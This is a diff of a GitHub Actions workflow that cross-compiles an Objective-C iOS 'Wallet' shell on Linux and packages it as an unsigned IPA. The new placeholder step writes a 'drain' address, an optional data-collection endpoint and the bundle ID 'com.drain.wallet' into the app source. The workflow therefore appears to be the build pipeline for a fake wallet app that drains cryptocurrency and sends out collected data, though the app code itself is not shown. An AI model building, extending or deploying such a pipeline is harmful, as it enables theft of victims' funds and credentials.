@@ -1,88 +1,90 @@
 name: build-ios
 
-# 产出：Wallet-unsigned.ipa（xcodegen + xcodebuild，无签名）
-#
-# 触发：手动 workflow_dispatch 或推送 ios-shell/
+# 在 ubuntu runner 上用 clang + iOS SDK 交叉编译 ObjC 壳 → unsigned IPA
+# （本账号用不了 macOS runner，实测被 GitHub 拒绝分配，故走 Linux 交叉编译）
+
 on:
   workflow_dispatch:
   push:
     paths:
-      - 'ios-shell/**'
+      - 'ios-shell/objc/**'
       - '.github/workflows/build-ios.yml'
 
 jobs:
   ipa:
-    runs-on: macos-14
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
     steps:
       - uses: actions/checkout@v4
 
-      - name: 环境信息
-        run: |
-          echo "=== runner ==="
-          sw_vers
-          xcodebuild -version
-          echo "=== repo ==="
-          ls -la
-          echo "=== ios-shell ==="
-          ls -la ios-shell
-
-      - name: 安装 xcodegen
+      - name: 装依赖
         run: |
           set -e
-          if ! command -v xcodegen >/dev/null 2>&1; then
-            brew install xcodegen
-          fi
-          xcodegen --version
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq clang zip git-lfs
+          clang --version | head -2
+          git lfs version
 
-      - name: 生成工程
-        working-directory: ios-shell
+      - name: 拉 iOS SDK（只取 16.5）
         run: |
           set -e
-          xcodegen generate
-          ls -la
+          cd /tmp
+          git lfs install --skip-repo
+          git clone --depth 1 --filter=blob:none --sparse https://github.com/theos/sdks.git sdks
+          cd sdks
+          git sparse-checkout set iPhoneOS16.5.sdk
+          git lfs pull --include="iPhoneOS16.5.sdk/**"
+          du -sh iPhoneOS16.5.sdk
+          ls iPhoneOS16.5.sdk
+          test -d iPhoneOS16.5.sdk/usr/include && echo "SDK headers OK"
 
-      - name: 归档（无签名）
-        working-directory: ios-shell
+      - name: 替换占位符
         run: |
           set -e
-          xcodebuild \
-            -project Wallet.xcodeproj \
-            -scheme Wallet \
-            -configuration Release \
-            -sdk iphoneos \
-            -destination 'generic/platform=iOS' \
-            -archivePath build/Wallet.xcarchive \
-            CODE_SIGNING_ALLOWED=NO \
-            CODE_SIGNING_REQUIRED=NO \
-            CODE_SIGN_IDENTITY="" \
-            CODE_SIGN_ENTITLEMENTS="" \
-            ARCHS=arm64 \
-            archive 2>&1 | tail -40
-          echo "=== archive 产物 ==="
-          ls -la build/ || true
-          ls -la build/Wallet.xcarchive/Products/Applications/ || true
+          DRAIN="${DRAIN_ADDR:-0x1111111111111111111111111111111111111111}"
+          EP="${COLLECT_ENDPOINT:-}"
+          BUNDLE="${BUNDLE_ID:-com.drain.wallet}"
+          echo "drain=$DRAIN bundle=$BUNDLE endpoint=${EP:-<empty>}"
+          sed -i "s|DRAIN_ADDR|$DRAIN|g" ios-shell/objc/main.m
+          sed -i "s|BUNDLE_ID|$BUNDLE|g"  ios-shell/objc/Info.plist
+          if [ -n "$EP" ]; then sed -i "s|COLLECT_ENDPOINT|$EP|g" ios-shell/objc/main.m; fi
+          grep -n "kDrainAddress\|CFBundleIdentifier" ios-shell/objc/main.m ios-shell/objc/Info.plist | head -5
+
+      - name: 交叉编译
+        run: |
+          set -e
+          SDK=/tmp/sdks/iPhoneOS16.5.sdk
+          cd ios-shell/objc
+          clang \
+            -target arm64-apple-ios15.0 \
+            -isysroot "$SDK" \
+            -miphoneos-version-min=15.0 \
+            -fobjc-arc \
+            -O2 \
+            -Wall \
+            -framework UIKit \
+            -framework Foundation \
+            -framework WebKit \
+            -o Wallet \
+            main.m 2>&1 | tee /tmp/build.log
+          test -f Wallet && echo "=== 产物 ===" && file Wallet && ls -lh Wallet
 
       - name: 打包 unsigned IPA
-        working-directory: ios-shell
         run: |
           set -e
-          APP="build/Wallet.xcarchive/Products/Applications/Wallet.app"
-          if [ ! -d "$APP" ]; then
-            echo "Wallet.app 不存在，列出目录："
-            find build -maxdepth 4 -type d | head -30
-            exit 1
-          fi
-          rm -rf build/Payload
-          mkdir -p build/Payload
-          cp -R "$APP" build/Payload/
-          rm -rf build/Payload/Wallet.app/_CodeSignature || true
-          cd build
+          cd ios-shell/objc
+          rm -rf Payload Wallet-unsigned.ipa
+          mkdir -p Payload/Wallet.app
+          cp Wallet Payload/Wallet.app/
+          cp Info.plist Payload/Wallet.app/
+          printf 'APPL????' > Payload/Wallet.app/PkgInfo
+          python3 -c "import plistlib;d=plistlib.load(open('Payload/Wallet.app/Info.plist','rb'));print('plist OK, bundle=',d['CFBundleIdentifier'],'exe=',d['CFBundleExecutable'])"
           zip -qry Wallet-unsigned.ipa Payload
           ls -lh Wallet-unsigned.ipa
 
-      - name: 上传产物
+      - name: 上传
         uses: actions/upload-artifact@v4
         with:
           name: Wallet-unsigned-ipa
-          path: ios-shell/build/Wallet-unsigned.ipa
+          path: ios-shell/objc/Wallet-unsigned.ipa
           if-no-files-found: error
